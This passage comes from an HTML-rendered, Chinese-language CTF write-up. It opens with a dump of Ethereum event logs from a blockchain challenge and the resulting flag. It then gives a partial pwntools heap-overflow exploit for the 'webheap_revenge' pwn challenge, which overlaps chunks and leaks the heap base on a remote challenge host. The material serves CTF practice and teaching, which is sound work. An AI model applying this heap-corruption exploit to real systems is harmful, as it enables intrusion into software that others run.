class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x5a55b2d970d079d39ce4c5dc9ec6de52ebfc2bbcfc7466d62eea534ee8736673&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000539&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>4</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0x4C9229666BcBb8FEB354acBaf77cD408e4eD5D50&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000539&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>5</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000002&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>6</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x5a55b2d970d079d39ce4c5dc9ec6de52ebfc2bbcfc7466d62eea534ee8736673&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000002&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000539&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>7</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0x4C9229666BcBb8FEB354acBaf77cD408e4eD5D50&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>9</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x5a55b2d970d079d39ce4c5dc9ec6de52ebfc2bbcfc7466d62eea534ee8736673&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>10</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x23ddb4dbb8577d03ebf1139a17a5c016963c43761e8ccd21eaa68e9b8ce6a68e&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>11</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>})]</span>
</span></span></code></pre></td></tr></table></div></div><p>进入<code>Option 3</code>，获取<code>flag</code>。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/39.png alt=39></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag{dbf227cc-3cbe-4237-b68b-2269e00a3ed0}
</span></span></code></pre></td></tr></table></div></div><h1 id=pwn>pwn</h1><h2 id=webheap_revenge>webheap_revenge</h2><p>和webheap差不多，只是uaf改成了堆溢出，先改size造成重叠，然后申请出来就可以使用，泄露libc采用分割unsorted的方法就行了。
exp如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#sh = process(&#39;./webheap_revenge&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;172.51.122.128&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc-2.27.so&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_qword</span><span class=p>(</span><span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x83</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_dword</span><span class=p>(</span><span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x86</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_str</span><span class=p>(</span><span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xbd</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=nb>str</span><span class=p>)</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;little&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>packet</span><span class=p>(</span><span class=n>opt</span><span class=p>,</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>,</span><span class=n>ctt</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xb9\x05</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>make_dword</span><span class=p>(</span><span class=n>opt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>make_qword</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>make_qword</span><span class=p>(</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>make_str</span><span class=p>(</span><span class=n>ctt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>make_qword</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sendpkt</span><span class=p>(</span><span class=n>opt</span><span class=p>,</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=o>=</span><span class=mh>0x30</span><span class=p>,</span><span class=n>ctt</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;aaa&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>packet</span><span class=p>(</span><span class=n>opt</span><span class=p>,</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>,</span><span class=n>ctt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Packet length: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Content: &#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>script</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dbg</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>sh</span><span class=p>,</span><span class=n>script</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rbt_bpt</span><span class=p>(</span><span class=n>off</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>script</span>
</span></span><span class=line><span class=cl>    <span class=n>script</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;b * $rebase(</span><span class=si>{</span><span class=n>off</span><span class=si>:</span><span class=s1>#x</span><span class=si>}</span><span class=s1>)</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># rbt_bpt(0x3d80)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sendpkt</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sendpkt</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dele</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sendpkt</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>ctt</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sendpkt</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>idx</span><span class=p>,</span><span class=n>ctt</span><span class=o>=</span><span class=n>ctt</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># dbg()</span>
</span></span><span class=line><span class=cl><span class=c1># sendpkt(0x0,0x0,0x520)</span>
</span></span><span class=line><span class=cl><span class=c1># sendpkt(0x0,0x1,0x30)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x430</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x28</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xa1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x421</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x421</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x411</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  <span class=c1># 0xa0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x98</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap_base</span> <span class=o>=</span> <span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>&lt;&lt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x13000</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;heap base is leaked ==&gt; &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
